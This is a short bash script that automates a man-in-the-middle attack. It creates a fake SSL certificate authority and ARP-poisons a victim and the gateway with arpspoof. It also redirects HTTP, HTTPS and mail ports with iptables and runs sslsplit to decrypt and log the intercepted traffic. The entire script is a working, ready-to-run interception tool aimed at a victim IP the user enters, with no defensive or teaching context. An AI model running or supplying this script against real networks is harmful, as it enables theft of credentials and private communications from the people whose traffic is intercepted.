#Script for MITM attack automation with SSL SPLIT and automated generation of SSL certificates#

#! /bin/bash

echo "Creating Logs Folder..."
mkdir /root/ataquessl/
cd /root/ataquessl/

echo "Fake SSL certificate generation:"

openssl genrsa -out /root/ataquessl/ca.key 2048

gnome-terminal -e "bash -c 'openssl req -new -x509 -days 1800 -key /root/ataquessl/ca.key -out /root/ataquessl/ca.crt'" 

echo "Enabling IP Forwarding"
sleep 3
echo 1 > /proc/sys/net/ipv4/ip_forward

echo "OK…"
sleep 3
echo "Showing configuration of network interfaces:"

ifconfig

echo "Select Network Interface: eth0, eth1…."

read INTERFAZ 

echo "Enter Gateway IP:"

read GATEWAY

echo "Enter the victim´s IP:"

read VICTIMA 

echo "Performing ARP poisoning"

gnome-terminal --tab -e "bash -c 'arpspoof -t $VICTIMA $GATEWAY -i $INTERFAZ'" --tab -e "bash -c 'arpspoof -t $GATEWAY $VICTIMA -i $INTERFAZ'" 

echo "ARP poisoning done"

echo "Generating data directory:"

mkdir logdir/

echo "Configuring IP TABLES for services HTTP, HTTPS, SMTP, IMAP:"

iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 25 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443

echo "Running SSLSplit:"

sslsplit -D -l connection.log -S logdir/ -k /root/ataquessl/ca.key -c /root/ataquessl/ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
